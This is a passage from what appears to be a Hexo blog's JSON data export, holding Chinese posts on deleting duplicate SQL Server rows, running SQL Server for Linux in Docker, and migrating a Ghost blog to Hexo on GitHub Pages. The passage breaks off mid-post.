onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>"},{"title":"Docker下配置SQL Server for Linux","date":"2016-11-22T14:44:06.000Z","_content":"\n# 前言\n\n微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。\n\nCanonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」\n\n<!--more -->\n![](/content/images/sqldocker/micosoft.png)\n# 配置要求\n\n* Docker版本在 1.8 以上\n* 至少 4GB 硬盘空间\n* 至少 4GB 内存\n\n![](/content/images/sqldocker/0.jpg)\n\n# 配置\n## 拉取docker镜像\n```\ndocker pull microsoft/mssql-server-linux\n```\n## 运行docker镜像\n\n``YourStrong!Passw0rd`` 为你的密码\n\n``1433`` 为对外端口\n```\n docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n🌰 例子\n```\nsudo docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n\n\n## 设置 宿主机保存数据目录(暂不支持)\n\n``<host directory>`` 为目录\n\n```\ndocker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -v <host directory>:/var/opt/mssql -d microsoft/mssql-server-linux\n```\n\n## 查看容器的ip(调试用)\n```\ndocker inspect --format='{{.NetworkSettings.IPAddress}}' 容器id\n```\n172.17.0.2\n\n# 连接\n用户名是SA\n\n密码是用户自己设置的\n\n![](/content/images/sqldocker/1.jpg)\n\n连接成功！\n\n![](/content/images/sqldocker/2.jpg)\n\n# 最后\n\n内存占用情况\n\n![](/content/images/sqldocker/3.jpg)\n\n\n我们一起默念** 微软大法好 ** ** 微软大法好 ** ** 微软大法好 ** 。\n\n谢谢微软为开源世界做的一切！\n\n# 参考\nhttps://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\n\n","source":"_posts/在Docker下的Ubuntu安装Sql-Server-for-Linux.md","raw":"---\ntitle: Docker下配置SQL Server for Linux\ndate: 2016-11-22 14:44:06\ntags: docker sql-server\npermalink: docker-SQLServer\ncategories: docker\n---\n\n# 前言\n\n微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。\n\nCanonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」\n\n<!--more -->\n![](/content/images/sqldocker/micosoft.png)\n# 配置要求\n\n* Docker版本在 1.8 以上\n* 至少 4GB 硬盘空间\n* 至少 4GB 内存\n\n![](/content/images/sqldocker/0.jpg)\n\n# 配置\n## 拉取docker镜像\n```\ndocker pull microsoft/mssql-server-linux\n```\n## 运行docker镜像\n\n``YourStrong!Passw0rd`` 为你的密码\n\n``1433`` 为对外端口\n```\n docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n🌰 例子\n```\nsudo docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n\n\n## 设置 宿主机保存数据目录(暂不支持)\n\n``<host directory>`` 为目录\n\n```\ndocker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -v <host directory>:/var/opt/mssql -d microsoft/mssql-server-linux\n```\n\n## 查看容器的ip(调试用)\n```\ndocker inspect --format='{{.NetworkSettings.IPAddress}}' 容器id\n```\n172.17.0.2\n\n# 连接\n用户名是SA\n\n密码是用户自己设置的\n\n![](/content/images/sqldocker/1.jpg)\n\n连接成功！\n\n![](/content/images/sqldocker/2.jpg)\n\n# 最后\n\n内存占用情况\n\n![](/content/images/sqldocker/3.jpg)\n\n\n我们一起默念** 微软大法好 ** ** 微软大法好 ** ** 微软大法好 ** 。\n\n谢谢微软为开源世界做的一切！\n\n# 参考\nhttps://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\n\n","slug":"docker-SQLServer","published":1,"updated":"2016-11-22T21:53:33.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym30170017cdonzyn2h86c","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>\n<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>\n<a id=\"more\"></a>\n<p><img src=\"/content/images/sqldocker/micosoft.png\" alt=\"\"></p>\n<h1 id=\"配置要求\"><a href=\"#配置要求\" class=\"headerlink\" title=\"配置要求\"></a>配置要求</h1><ul>\n<li>Docker版本在 1.8 以上</li>\n<li>至少 4GB 硬盘空间</li>\n<li>至少 4GB 内存</li>\n</ul>\n<p><img src=\"/content/images/sqldocker/0.jpg\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><h2 id=\"拉取docker镜像\"><a href=\"#拉取docker镜像\" class=\"headerlink\" title=\"拉取docker镜像\"></a>拉取docker镜像</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"运行docker镜像\"><a href=\"#运行docker镜像\" class=\"headerlink\" title=\"运行docker镜像\"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>\n<p><code>1433</code> 为对外端口<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<p>🌰 例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<h2 id=\"设置-宿主机保存数据目录-暂不支持\"><a href=\"#设置-宿主机保存数据目录-暂不支持\" class=\"headerlink\" title=\"设置 宿主机保存数据目录(暂不支持)\"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"查看容器的ip-调试用\"><a href=\"#查看容器的ip-调试用\" class=\"headerlink\" title=\"查看容器的ip(调试用)\"></a>查看容器的ip(调试用)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>\n<p>172.17.0.2</p>\n<h1 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h1><p>用户名是SA</p>\n<p>密码是用户自己设置的</p>\n<p><img src=\"/content/images/sqldocker/1.jpg\" alt=\"\"></p>\n<p>连接成功！</p>\n<p><img src=\"/content/images/sqldocker/2.jpg\" alt=\"\"></p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>内存占用情况</p>\n<p><img src=\"/content/images/sqldocker/3.jpg\" alt=\"\"></p>\n<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>\n<p>谢谢微软为开源世界做的一切！</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\" target=\"_blank\" rel=\"external\">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>\n<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>","more":"<p><img src=\"/content/images/sqldocker/micosoft.png\" alt=\"\"></p>\n<h1 id=\"配置要求\"><a href=\"#配置要求\" class=\"headerlink\" title=\"配置要求\"></a>配置要求</h1><ul>\n<li>Docker版本在 1.8 以上</li>\n<li>至少 4GB 硬盘空间</li>\n<li>至少 4GB 内存</li>\n</ul>\n<p><img src=\"/content/images/sqldocker/0.jpg\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><h2 id=\"拉取docker镜像\"><a href=\"#拉取docker镜像\" class=\"headerlink\" title=\"拉取docker镜像\"></a>拉取docker镜像</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"运行docker镜像\"><a href=\"#运行docker镜像\" class=\"headerlink\" title=\"运行docker镜像\"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>\n<p><code>1433</code> 为对外端口<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<p>🌰 例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<h2 id=\"设置-宿主机保存数据目录-暂不支持\"><a href=\"#设置-宿主机保存数据目录-暂不支持\" class=\"headerlink\" title=\"设置 宿主机保存数据目录(暂不支持)\"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"查看容器的ip-调试用\"><a href=\"#查看容器的ip-调试用\" class=\"headerlink\" title=\"查看容器的ip(调试用)\"></a>查看容器的ip(调试用)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>\n<p>172.17.0.2</p>\n<h1 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h1><p>用户名是SA</p>\n<p>密码是用户自己设置的</p>\n<p><img src=\"/content/images/sqldocker/1.jpg\" alt=\"\"></p>\n<p>连接成功！</p>\n<p><img src=\"/content/images/sqldocker/2.jpg\" alt=\"\"></p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>内存占用情况</p>\n<p><img src=\"/content/images/sqldocker/3.jpg\" alt=\"\"></p>\n<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>\n<p>谢谢微软为开源世界做的一切！</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>"},{"title":"GHOST搬迁到HEXO(Github Pages)指南","date":"2016-09-12T20:41:59.000Z","_content":"# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","source":"_posts/GHOST搬迁到HEXO-Github-Pages-指南.md","raw":"---\ntitle: GHOST搬迁到HEXO(Github Pages)指南\ndate: 2016-09-12 21:41:59\ntags: Web\ncategories: Web\n---\n# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 